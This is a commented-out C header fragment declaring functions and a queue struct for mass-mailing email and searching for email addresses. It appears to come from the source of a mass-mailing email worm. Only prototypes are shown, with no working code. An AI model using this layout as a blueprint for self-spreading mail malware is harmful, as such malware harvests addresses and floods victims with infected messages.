/*#ifndef NO_EMAIL

void mk_smtpdate(FILETIME *in_ft, char *buf);
char *strrchr(const char *str, char ch);
char *strchr(const char *str, char ch);
int memcmpi(unsigned char *, unsigned char *, int);
int html_replace(char *);
int html_replace2(char *);
int cat_wsprintf(LPTSTR lpOutput, LPCTSTR lpFormat, ...);


#pragma pack(push, 1)
struct mailq_t {
	struct mailq_t *next;
	unsigned long tick_got;
	char state;		
	char priority;	
	char to[1];	
};
#pragma pack(pop)

extern struct mailq_t * volatile massmail_queue;

int massmail_addq(const char *email, int prior);

void MassMailInit(void);
void MassMail(void);
DWORD WINAPI MassMailThread(LPVOID);

char *msg_generate(char *email);

void Search(void);
void SearchInit(void);
void SearchMain(void);
void SearchFreeze(int do_freeze);

DWORD WINAPI SearchEmail(LPVOID param);

#endif
*/